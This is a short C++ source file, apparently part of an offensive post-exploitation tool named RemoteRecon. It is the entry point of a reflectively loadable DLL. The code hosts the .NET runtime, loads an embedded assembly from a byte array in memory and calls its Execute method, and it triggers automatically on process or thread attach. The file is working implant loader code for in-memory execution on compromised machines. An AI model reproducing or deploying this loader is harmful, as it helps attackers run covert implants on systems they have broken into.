// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include "RemoteReconKS_dll.hpp"
#include "clr.hpp"
#include "ReflectiveLoader.h"


void LoadAndRun(LPVOID lpParam)
{
	clr::ClrDomain domain;
	char* argument = "Replace-Me  ";

	std::vector<uint8_t> vec(RemoteReconKS_dll, RemoteReconKS_dll + REMOTERECONKS_dll_len);
	auto res = domain.load(vec);

	if (!res) {
		exit(0);
	}

	res->invoke_static(L"RemoteReconKS.RemoteReconKS", L"Execute", argument);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
		//MessageBox(0, "Testing Native Dll", "Native", MB_OK);
		LoadAndRun(NULL);
		break;
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

